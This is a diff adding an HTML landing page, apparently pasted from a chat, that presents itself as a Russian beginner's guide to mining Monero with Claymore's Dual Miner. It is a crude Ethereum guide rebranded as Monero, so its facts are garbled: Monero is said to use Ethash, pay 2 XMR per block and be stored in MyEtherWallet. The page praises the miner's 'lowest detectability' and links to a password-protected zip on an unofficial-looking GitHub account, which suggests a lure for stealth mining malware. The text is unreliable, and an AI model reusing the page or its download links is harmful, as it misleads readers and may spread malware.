@@ -1,0 +1,676 @@
+DieKaND, [14.07.2024 20:45]
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="lt-ie9 lt-ie8 lt-ie7" lang="ru" dir="ltr"><![endif]-->
+<!--[if IE 7]><html class="lt-ie9 lt-ie8" lang="ru" dir="ltr"><![endif]-->
+<!--[if IE 8]><html class="lt-ie9" lang="ru" dir="ltr"><![endif]-->
+<!--[if gt IE 8]><!--><html lang="ru" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#"><!--<![endif]-->
+<head>
+<title>Майнинг Эфира - (ETH) вся актуальная информация [2020]</title>
+<meta charset="utf-8" />
+<link rel="canonical" href="https://claymoredualminer.com/majning-efira" /> 
+<link rel="shortcut icon" href="items/favicon.ico" type="image/vnd.microsoft.icon" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+<meta name="MobileOptimized" content="width" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="description" content=
+
+<link rel="stylesheet" href="/css/XMR.css">
+<link rel="stylesheet" href="/css/global.base.css">
+<link rel="stylesheet" href="/css/global.styles.css">
+<link rel="stylesheet" href="/css/at.layout.css">
+
+
+<link type="text/css" rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" media="all" />
+<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-137173386-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-137173386-2');
+</script>
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(53083204, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/53083204" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+<!-- Yandex.Metrika domain -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(56512528, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/56512528" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+
+<meta name="yandex-verification" content="1facbca6aff9a0eb" />
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MKVRMS2');</script>
+<!-- End Google Tag Manager -->
+
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics domain -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-137173386-4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-137173386-4');
+</script>
+
+</head>
+<body>
+
+
+<div id="page-wrapper">
+
+DieKaND, [14.07.2024 20:45]
+<div id="page" class="page at-mt eth-inner">
+
+
+<div id="menu-bar" class="nav clearfix">
+ <nav id="block-menu-menu-primary-menu" class="block block-menu menu-wrapper menu-bar-wrapper clearfix at-menu-toggle block-menu-primary-menu eth-menu" role="navigation">        
+
+  <div class="menu-toggle">
+   <ul class="menu clearfix">
+   <li class="leaf"><a href="https://claymoredualminer.com/ru" title="">Главная</a></li>
+    <li class="first leaf"><a href="#start" title="">Быстрый старт</a></li>
+    <li class="leaf"><a href="#download" title="">Скачать</a></li>
+
+   </ul>
+  </div>  
+ </nav>
+ </div>
+
+<section class="XMR-header">
+ <div class="XMR-header-flex">
+  <div class="XMR-header-center eth-vi">
+   <div class="XMR-header-composition">
+   <h2>Claymore's Dual Monero AMD+NVIDIA GPU Miner</h2>
+   <p class="eth-fast"><span class="green">Самый быстрый Moneto</span>/Ethash майнер с <span class="green">самой низкой заметности </span></p> 
+   <div class="eth-button"><i class="far fa-arrow-alt-circle-down"></i><a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.v15.0.-.widows.Password-claymore.zip">Скачать</a>
+   </div>
+   </div>
+  </div>
+ </div>
+</section>
+<section class="eth-art">
+<H1 class="eth-title"><a id="start">Майнинг Монеро: Руководство для начинающих</a></h1>
+ <div class="eth-vi2">
+<p>Начать работу с майнингом Монеро теперь проще, чем когда-либо. Все, что вам нужно, это видеокарта (GPU), и вы можете начать зарабатывать деньги сегодня!</p>
+<h2>Краткое резюме</h2>
+<p>Вот краткое руководство о том, как добывать Монеро:</p>
+<ul>
+ <li>Шаг 1 - Установите свои видеокарты и настройте компьютер</li>
+ <li>Шаг 2 - Получите кошелек Монеро (Mist или MyEtherWallet)</li>
+ <li>Шаг 3 - Присоединитесь к майнинг пулу</li>
+ <li>Шаг 4 - Начните майнинг!</li>
+</ul>
+<h2>Вот что мы рассмотрим в этом посте:</h2>
+
+<div class="toc-wrapper">
+<span class="toc-title">Содержание</span>
+<ol class="toc">
+<li class="toc-h2"><a href="#sect3" class="toc-h2">Монеро в двух словах</a></li>
+<li class="toc-h2"><a href="#sect5" class="toc-h2">Должен ли я добывать Монеро?</a></li>
+<li class="toc-h2"><a href="#sect6" class="toc-h2">Расчет рентабельности майнинга Монеро</a></li>
+<li class="toc-h2"><a href="#sect8" class="toc-h2">Выбор оборудования для майнинга</a></li>
+<li class="toc-h2"><a href="#sect9" class="toc-h2">Требования к операционной системе для майнинга</a></li>
+<li class="toc-h2"><a href="#sect10" class="toc-h2">Пошаговое руководство по Mining Монеро на вашем ПК</a></li>
+<li class="toc-h2"><a href="#sect11" class="toc-h2">Шаг 1: Установите драйверы вашей видеокарты</a></li>
+<li class="toc-h2"><a href="#sect12" class="toc-h2">Шаг 2: Получить адрес кошелька Монеро</a></li>
+<li class="toc-h2"><a href="#sect13" class="toc-h2">Шаг 3: Синхронизировать блокчейн</a></li>
+<li class="toc-h2">
+<a href="#sect14" class="toc-h2">Шаг 4: Настройте свой кошелек</a>
+</li>
+<li class="toc-h2"><a href="#sect16" class="toc-h2">Шаг 5: Установите кошелек с MyEtherWallet.com</a></li>
+<li class="toc-h2"><a href="#sect17" class="toc-h2">Шаг 6: Загрузите Claymore Monero Miner</a></li>
+<li class="toc-h2"><a href="#sect18" class="toc-h2">Шаг 7. Настройте некоторые параметры Windows перед майнингом.</a>
+</li>
+<li class="toc-h2"><a href="#sect19" class="toc-h2">Шаг 8: Присоединитесь к пулу и настройте свой Bat файл</a></li>
+<li class="toc-h2"><a href="#sect20" class="toc-h2">Шаг 9: Начните получать Monero!</a></li>
+<li class="toc-h2"><a href="#sect21" class="toc-h2">Часто задаваемые вопросы</a></li>
+<li class="toc-h2"><a href="#sect25" class="toc-h2">Вывод</a></li>
+</ol>
+</div>
+
+
+<div>
+<hr /></div>
+<p><strong>Не любишь читать? Посмотрите видео версию этого руководства:</strong></p>
+
+<div class="video mar">
+<iframe width="789" height="444" src="https://www.youtube.com/embed/PET8OgA_xvw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</div>
+<div>
+<hr /></div>
+<h2><a id="sect3"></a>1. Monero в двух словах</h2>
+<p><strong>Основы Monero Блокчейн</strong></p>
+
+DieKaND, [14.07.2024 20:45]
+<p>Прежде чем мы углубимся в детали того, как добывать эфир, важно немного разобраться в блокчейне Эфириума. Неудивительно, что основы блокчейна Monero очень похожи на Биткойн. </p>
+<p>Хотя концептуально они очень похожи, существуют значительные технические различия. Некоторые из них более очевидны; Например, блоки Monero добавляются каждые 13 секунд (в среднем), а блоки биткойна добавляются каждые 10 минут (в среднем).</p>
+<p class="vaz">В качестве награды майнеры Monero получают 2 Xmr плюс всю комиссию за транзакции и обработку кода (или газ), содержащиеся в их блоке.</p>
+<p>Что касается алгоритма майнинга, Monero использует алгоритм хеширования, известный Ethash, который отличается от хэша Биткойна. Ethash несовместим со специальным хеширующим оборудованием (ASIC), разработанным для майнинга биткойнов. Кроме того, это алгоритм памяти, что означает, что он разработан, чтобы противостоять разработке ASIC для майнинга Monero. Вместо этого Ethash намеренно лучше всего подходит для майнинга на GPU.</p>
+<h2>Хэшрейт, Сложность и Цена</h2>
+<p>Если предположить, что количество оборудования, предназначенного для майнинга Monero, растет, почему блоки не добываются быстрее, так что бы среднее время 15-секундного блока уменьшилось?</p>
+<p class="vaz2">Ответ - Сложность.</p>
+<p>Благодаря автоматической настройке вычислительной сложности, решения блока в блокчейне Monero способен поддерживать интервалы ~ 13 секунд. Вы заметите сложность<u>,</u> внимательно коррелирующую с хэшрейтом.</p>
+<p>Следующий очевидный вопрос заключается в том, что движет изменениями в скорости и сложности в первую очередь? Ответ - цена! Как видно на рисунке ниже, хэшрейт следовал (с некоторым заметным лагом) цене XMR:</p>
+<p>
+<a href="items/start/how/price.png" target="_blank">
+<img src="items/start/how/price.png" alt="claymore"></a>
+</p>
+<div class="tradingview-widget-container">
+  <div id="tradingview_2faef"></div>
+
+  <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+  <script type="text/javascript">
+  new TradingView.widget(
+  {
+  "autosize": true,
+  "symbol": "KRAKEN:ETHUSD",
+  "timezone": "Etc/UTC",
+  "theme": "Light",
+  "style": "1",
+  "locale": "en",
+  "toolbar_bg": "#f1f3f6",
+  "enable_publishing": true,
+  "withdateranges": true,
+  "range": "ytd",
+  "hide_side_toolbar": false,
+  "allow_symbol_change": true,
+  "details": true,
+  "hotlist": true,
+  "calendar": true,
+  "news": [
+    "stocktwits",
+    "headlines"
+  ],
+  "show_popup_button": true,
+  "popup_width": "1000",
+  "popup_height": "650",
+  "container_id": "tradingview_2faef"
+}
+  );
+  </script>
+</div>
+<h2><a id="sect5"></a>2. Должен ли я добывать Monero?</h2>
+<p>Вот несколько веских причин, чтобы добывать XMR:</p>
+<ul>
+ <li>Майнинг может стать отличным способом субсидировать покупку новой высокопроизводительной видеокарты (или двух, или трех…).</li>
+ <li>Поскольку XMR легко обменивается на биткойны (BTC), это дешевый способ медленно наращивать накопления в биткойнах.</li>
+ <li>По сравнению с XMR, BTC можно легко продать за наличные, поэтому, косвенно, майнинг XMR может стать хорошим способом пополнить свой банковский счет или заработать деньги. XMR  также можно продавать напрямую на нескольких крупных биржах, таких как <u>CEX.io</u> , Kraken, Gemini и <u>Coinbase</u> .</li>
+ <li>Майнинг может быть дешевым входным билетом на рынки Эфириума, любимый трейдерами за их высокую волатильность. Если вы хороший и / или счастливый трейдер, вы можете максимизировать свою прибыль.</li>
+ <li>Создание большой суммы ETH сейчас, на этапе майнинга Proof of Work, позволит вам зарабатывать проценты на ваших активах, если / когда XMR перейдет на Proof of Stake.</li>
+ <li>Если вы верите в концепцию Ethereum (несмотря на провал DAO и сомнения относительно жизнеспособности подхода XMR), вы можете поддержать и получить голос в сети Monero посредством майнинга.</li>
+</ul>
+<h2><a id="sect6"></a>3. Расчет рентабельности майнинга Monero </h2>
+<p>При более четком понимании блокчейна Monero и таких важных концепций, как сложность, пришло время выполнить некоторые экономические расчеты. </p>
+
+DieKaND, [14.07.2024 20:45]
+<p class="vaz">Этот шаг очень важен, и вы не должны его пропускать. Хотя майнинг приносит деньги, он также стоит и денег, и если вы принимаете неправильные решения, вы можете получить отрицательную рентабельность инвестиций (то есть заплатить больше, чем заработали).</p>
+
+<iframe src=https://www.coincalculators.io/widget.aspx?crypto=ethereum height ="270" width="325" frameBorder="0" style="overflow:hidden;" scrolling="no" ></iframe>
+
+
+<p>К счастью, мы создали <a href="https://99bitcoins.com/advanced-ethereum-mining-calculator/" target="_blank" rel="nofollow">калькулятор доходности майнинга </a>Monero<u>,</u> поэтому он довольно прост. В приведенном ниже калькуляторе заполните данные следующим образом:</p>
+<ul>
+ <li>Коэффициент сложности, курс ETH / USD: эти поля обновляются автоматически. Вы можете ввести свои собственные значения вручную для моделирования сценариев.</li>
+ <li>Hashrate, Power (Watts): используйте <a href="https://miningchamp.com/"  target="_blank" rel="nofollow">эту таблицу,</a> чтобы найти параметры в соответствии с маркой и моделью вашей видеокарты. Убедитесь, что измерение скорости хэширования одинаково для таблицы и калькулятора, т. е. MH/s, KH/s и т. д.</li>
+ <li>Комиссия за пул% (необязательно): введите свою комиссию за майнинг, если вы ведете майнинг через майнинг-пул <u>(</u>обычно это около 1% плюс комиссия за выплату 1 ETH). Оставьте это поле пустым, если вы занимаетесь майнингом самостоятельно (не рекомендуется)</li>
+ <li>Стоимость оборудования (в долларах США). Укажите здесь (в долларах США), сколько вы заплатили (или собираетесь заплатить) за свой видеокарта и любое другое оборудование для майнинга.</li>
+ <li>Стоимость электроэнергии (USD / кВтч): введите цену на электроэнергию, как указано в счете за коммунальные услуги. </li>
+</ul>
+<p>
+<a href="items/start/how/ETH_calc.png" target="_blank">
+<img src="items/start/how/ETH_calc.png" alt="ETH_calc"></a>
+</p>
+<p>Результат ввода доходности появится под калькулятором при вводе значений:</p>
+<p>
+<a href="items/start/how/ETH_calc_output.png" target="_blank">
+<img src="items/start/how/ETH_calc_output.png" alt="ETH_calc_output"></a>
+</p>
+<p>* В этом примере я использовал видеокарту 1080Ti с коммунальной стоимостью 20 центов за кВт/ч, без майнинга. Как видно из этого примера, эта установка не окупится даже после года майнинга…</p>
+<p class="vaz2">Помните, что в зависимости от вашей предполагаемой установки может потребоваться купить новый блок питания (PSU) для работы вашего оборудования. Электрически эффективный блок питания стоит дороже, но экономит затраты на электроэнергию в долгосрочной перспективе.</p>
+<p>Самое главное, важно понимать, что сложность и цена являются переменными, то есть они могут и, вероятно, будут значительно меняться со временем. Получаемый вами показатель рентабельности верен только на момент расчета.</p>
+
+<h3>Предупреждение о прибыльности</h3>
+<p>Планируется, что Ethereum перейдет на модель Proof of Stake в неустановленную дату, что означает, что он больше не будет добываться.</p>
+<p class="vaz">До каких-либо серьезных затрат на капитал необходимы дальнейшие исследования перспектив Эфириума. В то время как видеокарты могут быть настроены на майнинг других монет, а их стоимость частично возмещается за счет перепродажи, видеокарты быстро обесцениваются. </p>
+<p>Это особенно верно для карт, которые используются для постоянной, интенсивной работы - майнинга.</p>
+<p class="vaz2">Еще одна важная вещь, которую стоит учесть, это то, что со временем разработчики Ethereum вносят изменения в сеть, которые влияют на прибыль майнинга. Например, на хард-форке Ethereum 'Constantinople' награда за майнинг была уменьшена с 3 ETH до 2.</p>
+
+<h2><a id="sect8"></a>4. Выбор оборудования для майнинга</h2>
+<p>Эксперименты с различными вариантами выбора видеокарт в калькуляторе позволят выявить карту с оптимальным сочетанием цены и производительности с энергопотреблением (выраженным в MH/s на единицу валюты). </p>
+<p class="vaz3">Имейте в виду, что карты AMD превосходят NVidia в целях майнинга криптовалюты.</p>
+
+DieKaND, [14.07.2024 20:45]
+<p>Карта должна иметь как минимум 4 гигабайта оперативной памяти, иначе она не сможет правильно майнить Monero. Это связано с растущим DAG файлом (ориентированный ациклический граф), используемым в процессе хэширования Monero Proof of Work.</p>
+<h2><a id="sect9"></a>5. Требования к операционной системе для майнинга</h2>
+<p class="vaz5">Это руководство охватывает использование Windows 10 (убедитесь, что оно 64-разрядное). Существуют также различные дистрибутивы Linux, которые можно использовать (здесь не рассматриваются). </p>
+<p>Windows проще всего настроить, быстро запустить и запустить. В настоящее время нет версии для Mac.</p>
+<p>Вот некоторые основные соображения для построения майнинг установки:</p>
+<ul>
+ <li>Вы хотите получить материнскую плату с достаточным количеством слотов PCI-E для поддержки количества карт, которые вы используете.</li>
+ <li>Если вы используете более одной видеокарты, вам понадобится подключенный к компьютеру PCI-E Riser для каждой дополнительной видеокарты.</li>
+ <li>Что касается блоков питания, вы должны дважды проверить, что у вашего блока питания достаточно разъемов для поддержки количества работающих видеокарт и достаточной общей мощности для поддержки общего энергопотребления вашей системы (и для того, чтобы обеспечить себе некоторый запас  не менее 10-15%) ,</li>
+</ul>
+<p><a href="https://bytwork.com/komplektujushhie_dlja_majninga/psu" target="_blank">Байтворк.ком</a> - полезный сайт, на котором можно узнать, сколько 6- или 8-контактных разъемов питания PCI-E потребуется вашей видеокарте.</p>
+<ul>
+ <li>Вы хотите получить простой бюджетный процессор и минимум 4 ГБ оперативной памяти. Убедитесь, что ваша материнская плата, ЦП и ОЗУ совместимы (т.е. материнские платы LGA 1151 требуют ЦП на 1151 разъеме, а материнские платы DDR4 RAM / LGA 1150 требуют ЦП 1150 и ОЗУ DDR3)</li>
+ <li>Не забудьте кнопку питания! Возьмите простой выключатель кнопки питания ПК, который подключается к разъемам материнской платы, чтобы вы могли включить / выключить систему</li>
+ <li>Требуются стандартная клавиатура, мышь и монитор. При удаленном управлении вашей установкой (не описанной здесь в этом руководстве для начинающих) вам понадобится заглушка HDMI для подключения к вашей установке, чтобы она правильно загружалась в Windows для удаленного доступа.</li>
+</ul>
+<p class="vaz">Если ваша система соответствует общим требованиям и имеет хотя бы одну видеокарту с минимум 4 ГБ ОЗУ, вы можете майнить Ethereum. У некоторых игровых ноутбуков действительно есть высококлассные карты, но из-за значительного тепла, выделяемого при майнинге, ваш ноутбук может подвергнуться другим последствиям, поэтому лучше использовать настольную сборку.</p>
+<p>Виртуализированные среды, которые вы можете арендовать, обычно не имеют достаточно мощных выделенных видеокарт или просто не приносят прибыли, если они есть.</p>
+<p class="vaz3">В настоящее время не существует ASIC для Ethereum, поскольку он разработан как «устойчивый к ASIC» алгоритм хеширования Proof of Work, поэтому, если вы видите рекламу это – бегите, это обман.</p>
+<h2><a id="sect10"></a>6. Пошаговое руководство по Mining Ethereum на вашем ПК</h2>
+<p>Предположим, вы работаете с Windows, поэтому сосредоточимся на майнинге Ethereum на этой платформе.</p>
+<p>Весь процесс установки кошелька, загрузки майнера, настройки Windows и настройки запуска командного файла должен занимать менее 10 минут.</p>
+<h2><a id="sect11"></a>Шаг 1: Установите драйверы вашей видеокарты</h2>
+<p><strong>Видеокарты AMD:</strong> перейдите на <a href="https://amd.com/" target="_blank" rel="nofollow">amd.com,</a> затем выберите «Поддержка и драйверы».</p>
+<p>Введите информацию о вашем GPU и нажмите «Показать результаты»</p>
+<p>
+<a href="items/start/how/AMD-Driver.png" target="_blank">
+<img src="items/start/how/AMD-Driver.png" alt="AMD-Driver"></a>
+</p>
+<p>Нажмите кнопку Загрузить для текущего драйвера. Либо выберите «Загрузить предыдущие драйверы и программное обеспечение» с правой стороны, чтобы выбрать более старые версии.
+
+DieKaND, [14.07.2024 20:45]
+Это рекомендуется, поскольку некоторые версии драйверов известны как стабильные для майнинга (в зависимости от ваших карт), например:</p>
+<ul>
+ <li>R9 и старше - используйте 15.12</li>
+ <li>Серия RX 4XX - используйте 16.9.2 или 16.10.3</li>
+ <li>RX 5XX Series - поскольку они более новые, я бы порекомендовал сидеть с текущим драйвером на данный момент</li>
+</ul>
+
+<p>
+<a href="items/start/how/AMD-Driver2.png" target="_blank">
+<img src="items/start/how/AMD-Driver2.png" alt="AMD-Driver2"></a>
+</p>
+<p><strong>Видеокарты Nvidia:</strong> чтобы получить последние версии драйверов Nvidia GeForce, перейдите по <a href="https://www.geforce.com/drivers" target="_blank" rel="nofollow">ссылке https://www.geforce.com/drivers</a> . Введите данные своей карты и нажмите «Начать поиск». Загрузите текущую версию драйвера из результатов.</p>
+<p>
+<a href="items/start/how/Nvidia-Driver.png" target="_blank">
+<img src="items/start/how/Nvidia-Driver.png" alt="GPUs-in-Device-Manager"></a>
+</p>
+<p>Установите драйверы GPU, как обычно (Next, Next, Ok и т. д.) И перезагрузите компьютер. Вы узнаете, что ваши видеокарты распознаются правильно, если вы зайдете в диспетчер устройств (поиск в строке поиска Windows), и вы не увидите никаких предупреждающих знаков на своих видеокартах. Это должно выглядеть примерно так:</p>
+<p>
+<a href="items/start/how/GPUs-in-Device-Manager.png" target="_blank">
+<img src="items/start/how/GPUs-in-Device-Manager.png" alt="GPUs-in-Device-Manager"></a>
+</p>
+<p>Совет по устранению неполадок: некоторые майнеры успешно установили сразу все видеокарты, а затем установили драйверы. Другие предпочитают другой метод, в котором они сначала устанавливают одну карту, устанавливают драйверы и выключают систему.</p>
+<p class="vaz">Пока система выключена, они устанавливают остальные видеокарты. Когда они это сделают, они снова включат сборку и дадут всем видеокартам быть узнанным в Windows. </p>
+<p>Обратите внимание, что вы, вероятно, почувствуете, что система зависает, и увидите несколько мерцаний или кратких черных экранов, пока каждая карта обнаруживается Windows.</p>
+<p>В итоге я добился успеха в обоих направлениях, поэтому, если вы столкнулись с проблемой с одним методом, просто удалите драйверы и попробуйте другой метод. Если вам действительно нужно удалить драйверы, используйте программу DDU (Display Driver Uninstaller) с <a href="https://www.guru3d.com/files-tags/download-ddu.html" target="_blank" rel="nofollow">Guru3d.com,</a> чтобы удалить все <a href="https://www.guru3d.com/files-tags/download-ddu.html"  target="_blank" rel="nofollow">файлы,</a> а затем начать заново.</p>
+<h2><a id="sect12"></a>Шаг 2: Получить адрес кошелька Ethereum</h2>
+<p class="vaz4">Примечание. Шаги 2-4 объясняют, как загрузить официальный кошелек Ethereum, но для этого потребуется дождаться синхронизации полной цепочки блоков Ethereum. </p>
+<p>Чтобы пропустить это и начать работать намного быстрее, перейдите к шагу 5 и создайте кошелек, используя вместо этого MyEtherWallet или откройте кошелек прямо на бирже, например <a href="https://www.binance.com/?ref=26861559" target="_blank" rel="nofollow">Binance</a>.</p>
+<p>В этом руководстве я покажу вам, как установить официальный кошелек <a href="https://github.com/ethereum/mist/releases" target="_blank" rel="nofollow">Mist</a> с его дружественным и знакомым графическим интерфейсом:</p>
+<p>
+<a href="items/start/how/mist.png" target="_blank">
+<img src="items/start/how/mist.png" alt="mist wallet"></a>
+</p>
+<p>В пакете Mist находится кошелек Ethereum, который вам понадобится для получения прибыли от майнинга. </p>
+<p>Mist также включает в себя браузер Ethereum с различными функциями, такими как обмен сообщениями, социальная сеть и учебные пособия.</p>
+<p>Как подсказка, эти учебные пособия и социальная сеть являются полезными учебными ресурсами. Не бойтесь спрашивать у сообщества Ethereum!</p>
+<p>Чтобы скачать Mist, зайдите на <a href="https://github.com/ethereum/mist/releases" target="_blank" rel="nofollow">https://github.com/ethereum/mist/releases</a> и выберите самый последний выпуск:</p>
+<p>
+
+DieKaND, [14.07.2024 20:45]
+<a href="items/start/how/eth-github.png" target="_blank">
+<img src="items/start/how/eth-github.png" alt="eth-github"></a>
+</p>
+<p>Выберите последний выпуск, он будет иметь наибольшее число:
+</p>
+<p>
+<a href="items/start/how/eth wallet download.png" target="_blank">
+<img src="items/start/how/eth wallet download.png" alt="eth wallet download"></a>
+</p>
+<p>Прокрутите вниз до раздела «Загрузки». Вы можете выбрать Mist или отдельный кошелек Ethereum.</p>
+
+<p>Выберите запоминающуюся папку для загрузки для файла «Ethereum Wallet». Распакуйте его и обратите внимание, в какую папку он был извлечен. Перейдите в новую папку, найдите и запустите приложение Ethereum.</p>
+<p>
+<a href="items/start/how/eth wallet extract.png" target="_blank">
+<img src="items/start/how/eth wallet extract.png" alt="eth wallet extract"></a>
+</p>
+<h2><a id="sect13"></a>Шаг 3: Синхронизировать блокчейн</h2>
+<p>Следующим шагом будет просто подождать, пока блокчейн Ethereum загрузится и синхронизируется. Это более 10 гигабайт, поэтому этот процесс может занять некоторое время ...</p>
+<p class="vaz">Когда он завершится, потратьте несколько минут, чтобы ознакомиться с приложением Mist; интерфейс довольно понятен. Приложение еще не полностью отшлифовано, так что ожидайте несколько ошибок.</p>
+<h2><a id="sect14"></a>Шаг 4: Настройте свой кошелек</h2>
+<p>Затем откройте кошелек Ethereum и создайте новый аккаунт и кошелек. Этот кошелек будет содержать адрес выплат, по которому вы будете получать вознаграждения за майнинг из вашего пула или напрямую из блокчейна.</p>
+
+<p>
+<a href="items/start/how/account.png" target="_blank">
+<img src="items/start/how/account.png" alt="claymore"></a>
+</p>
+
+<p>Добавьте свой новый аккаунт, дайте ему запоминающееся имя майнинга. Храните пароль надежно!</p>
+<p>
+<a href="items/start/how/add-wallet.png" target="_blank">
+<img src="items/start/how/add-wallet.png" alt="add-wallet"></a>
+</p>
+<p>После создания Учетной записи добавьте кошелек и запишите или скопируйте в текстовый файл уникальный адрес. Этот адрес будет начинаться с символов «0x». Это необходимо для получения вознаграждений за майнинг ETH!</p>
+
+<h3>Примечание о Geth:</h3>
+<p>Mist также содержит Geth, популярный интерфейс командной строки. Вы можете выбрать для загрузки только <a href="https://github.com/ethereum/go-ethereum/releases" target="_blank" rel="nofollow">самое последнее приложение Geth</a> для своей системы, которое способно выполнять все функции Mist (и даже больше) из командной строки. </p>
+<p class="vaz">Geth (сокращение от «go-ethereum») позволяет вашему майнеру напрямую взаимодействовать с сетью Ethereum, но <strong>требует определенных знаний в области программирования.</strong></p>
+<p>Когда вы станете более опытным в майнинге и программировании Ethereum, Geth станет для вас более полезным, но пока он не рекомендуется, поскольку Geth - самый сложный путь для начала работы с майнингом Ethereum.</p>
+<h2><a id="sect16"></a>Шаг 5: Установите кошелек с MyEtherWallet.com</h2>
+<p>Примечание: пожалуйста, остерегайтесь фишинговых сайтов. Не вводите свой ключ на веб-сайте, на который вы пришли, нажав на ссылку. Всегда трижды проверяйте домен. Настоящим сайтом является MyEtherWallet.com.</p>
+<p>Введите надежный пароль и нажмите «Создать новый кошелек»:</p>
+<p>
+<a href="items/start/how/MyEW1.png" target="_blank">
+<img src="items/start/how/MyEW1.png" alt="MyEW1"></a>
+</p>
+<p>Загрузите «Файл хранилища ключей» и нажмите «Я понимаю». Продолжить.»</p>
+<p>
+<a href="items/start/how/MyEW2.png" target="_blank">
+<img src="items/start/how/MyEW2.png" alt="MyEW2"></a>
+</p>
+<p>Сохраните ваш личный ключ. Хорошей практикой является открытие блокнота и ввод вашей информации - пароля, закрытого ключа и вашего адреса Ethereum (который вы вскоре получите). </p>
+<p class="vaz">Сохраните этот текстовый файл вместе с файлом Keystore в зашифрованном файле (используя WinRar или аналогичную программу).</p>
+<p>После этого сохраните его копию на USB-накопителе или в облачном хранилище и удалите отдельные файлы (сохраняя только зашифрованный файл в цифровом виде).</p>
+<p>
+<a href="items/start/how/MyEW3.
+
+DieKaND, [14.07.2024 20:45]
+png" target="_blank">
+<img src="items/start/how/MyEW3.png" alt="MyEW3"></a>
+</p>
+<p>Нажмите <strong>Сохранить</strong> свой адрес, а затем выберите переключатель «Файл хранилища ключей». Нажмите «Выбрать файл кошелька», найдите недавно загруженный файл хранилища ключей (который начинается с «UTC ...») и выберите его.</p>
+<p>
+<a href="items/start/how/MyEW4.png" target="_blank">
+<img src="items/start/how/MyEW4.png" alt="MyEW4"></a>
+</p>
+<p>Затем вам будет предложено ввести пароль еще раз</p>
+<p>
+<a href="items/start/how/add-wallet.png" target="_blank">
+<img src="items/start/how/add-wallet.png" alt="add-wallet"></a>
+</p>
+<p>После разблокировки вы можете прокрутить вниз и увидеть «Ваш адрес» - это адрес вашего кошелька Ethereum, который мы будем использовать для майнинга. Сохраните его в отдельный текстовый файл блокнота и сохраните его на рабочем столе для быстрого доступа</p>
+<p class="vaz">Разрешите поделиться этим адресом, поскольку именно так люди будут отправлять вам ETH и так вы будете получать выплаты за майнинг, но никогда не сообщайте свой <strong>закрытый</strong> ключ!</p>
+<p>
+<a href="items/start/how/MyEW4.png" target="_blank">
+<img src="items/start/how/MyEW4.png" alt="MyEW4"></a>
+</p>
+<h2><a id="sect17"></a>Шаг 6: Загрузите Claymore Ethereum Miner</h2>
+<p>Мы собираемся использовать очень популярное программное обеспечение для майнинга Ethereum под названием Claymore Miner.</p>
+<p>Загрузите текущую версию по ссылкам для скачивания в Github или Mega (не используйте ссылки других людей). Текущая версия на момент написания этой статьи - 15.0.</p>
+</div>
+</section>
+<section class="eth-down">
+<div class="eth-title whitez1"><a id="download">Начните добывать Ethereum с Claymore's Dual  Miner </a></div>
+<div class="eth-download">
+ <div class="eth-flex"> 
+  <div class="eth-ver"> 
+  Последняя версия - v15.0
+  MD5: 549B215DDF355A633E2A7FD4B81E3CB2 *Claymore's Dual Ethereum  AMD+NVIDIA GPU Miner v15.0 - Windows.zip
+  <span class="nev2">(<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip">Скачать для Linux</a>)</span> 
+  </div>
+  <div class="eth-get">
+  <span class="eth-password">Пароль: claymore</span>
